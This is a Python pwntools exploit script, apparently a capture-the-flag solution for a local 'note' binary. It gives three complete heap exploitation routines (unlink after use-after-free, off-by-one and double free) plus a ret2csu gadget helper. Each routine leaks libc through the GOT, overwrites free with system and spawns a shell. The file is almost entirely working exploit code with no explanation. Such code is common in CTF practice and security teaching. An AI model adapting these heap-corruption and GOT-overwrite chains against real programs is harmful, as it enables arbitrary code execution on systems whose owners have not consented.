from pwn import *

context.log_level = 'debug'
context.aslr = False

#io = remote('localhost', 1808)
io = process('./note')
e = ELF('./note')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x00401866
	addr2 = 0x00401850
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)

def new_note(buf, size):
	answer('Option:', '3')
	answer('length:', str(size))
	answer('contents:', buf)

def show_note(id):
	answer('Option:', '1')
	answer('id:', str(id))

def delete_note(id):	
	answer('Option:', '4')
	answer('id:', str(id))

def edit_note(id, buf):	
	answer('Option:', '2')	
	answer('id:', str(id))
	answer('contents:', buf)

# off-by-one
# uaf
# double free

def uaf_unlink():
	new_note('/bin/sh', 0x98)
	new_note('/bin/sh', 0x98)
	new_note('/bin/sh', 0x98)

	delete_note(1)

	ptr = 0x0602100 + 0x8 + 0x10

	payload = p64(0) + p64(0x91)
	payload += p64(ptr - 0x18) + p64(ptr - 0x10)
	payload += 'A' * 0x70
	payload += p64(0x90)

	edit_note(1, payload)  

	delete_note(2)

	payload = p64(0x98) + p64(e.got['read'])[:-1]  # onebyte for lengthc
	edit_note(1, payload)
	show_note(0)

	io.recvuntil('Note 0: ')
	buf = io.recv(6)
	read_addr = u64(buf.ljust(8, '\x00'))
	log.success('read:%#x' % read_addr)

	libc.address = read_addr - libc.symbols['read']

	payload = p64(0x98) + p64(e.got['free'])[:-1]
	edit_note(1, payload)
	edit_note(0, p64(libc.symbols['system'])[:-1])

	delete_note(2)
	io.interactive()

def off_by_one():
	new_note('/bin/sh', 0xf8)
	new_note('/bin/sh', 0xf8)
	new_note('/bin/sh', 0xf8)

	delete_note(1)
	ptr = 0x0602100 + 0x8 + 0x10

	payload = p64(0) + p64(0xf1)
	payload += p64(ptr - 0x18) + p64(ptr - 0x10)
	payload += 'A' * 0xd0
	payload += p64(0xf0)

	new_note(payload, 0xf8)
	gdb.attach(io)
	delete_note(2)

	payload = p64(0x98) + p64(e.got['read'])[:-1]  # onebyte for lengthc
	edit_note(1, payload)
	show_note(0)

	io.recvuntil('Note 0: ')
	buf = io.recv(6)
	read_addr = u64(buf.ljust(8, '\x00'))
	log.success('read:%#x' % read_addr)

	libc.address = read_addr - libc.symbols['read']

	payload = p64(0x98) + p64(e.got['free'])[:-1]
	edit_note(1, payload)
	edit_note(0, p64(libc.symbols['system'])[:-1])

	delete_note(2)
	io.interactive()


def double_free():
	new_note('/bin/sh', 0xf8)
	new_note('/bin/sh', 0xf8)
	new_note('/bin/sh', 0xf8)

	delete_note(1)
	delete_note(2)

	ptr = 0x0602100 + 0x8 + 0x10

	payload = p64(0) + p64(0xf1)
	payload += p64(ptr - 0x18) + p64(ptr - 0x10)
	payload += 'A' * 0xd0
	payload += p64(0xf0) + p64(0x100)
	payload += '/bin/sh'

	new_note(payload, 0xf8+0x100)

	#gdb.attach(io)
	delete_note(2)

	payload = p64(0x98) + p64(e.got['read'])[:-1]  # onebyte for lengthc
	edit_note(1, payload)
	show_note(0)

	io.recvuntil('Note 0: ')
	buf = io.recv(6)
	read_addr = u64(buf.ljust(8, '\x00'))
	log.success('read:%#x' % read_addr)

	libc.address = read_addr - libc.symbols['read']

	payload = p64(0x98) + p64(e.got['free'])[:-1]
	edit_note(1, payload)
	edit_note(0, p64(libc.symbols['system'])[:-1])

	delete_note(2)
	io.interactive()

uaf_unlink()
#double_free()
#off_by_one()
